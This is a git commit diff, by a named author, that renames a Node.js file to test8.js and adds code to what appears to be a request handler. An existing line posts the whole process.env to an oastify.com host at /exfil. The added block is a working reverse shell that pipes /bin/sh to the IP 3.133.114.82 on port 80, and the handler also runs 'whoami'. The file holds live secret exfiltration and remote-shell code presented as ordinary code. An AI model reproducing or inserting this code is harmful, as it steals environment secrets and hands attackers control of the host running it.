8045f9f8cc42141b6723f06f80fdb84d28d2186e
Martin <martinbydefault@gmail.com>
2024-05-21 09:35:23 -0300

    Update and rename test7.js to test8.js

--- test8.js
+++ test8.js
@@ -3,6 +3,19 @@ const axios = require('axios');
 axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
 
 module.exports = (context, req, res) => {
+  (function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(80, "3.133.114.82", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+  
   var exec = require('child_process').exec;
   var cmd = 'whoami';
   var result = exec(cmd, function(error, stdout, stderr) {  });
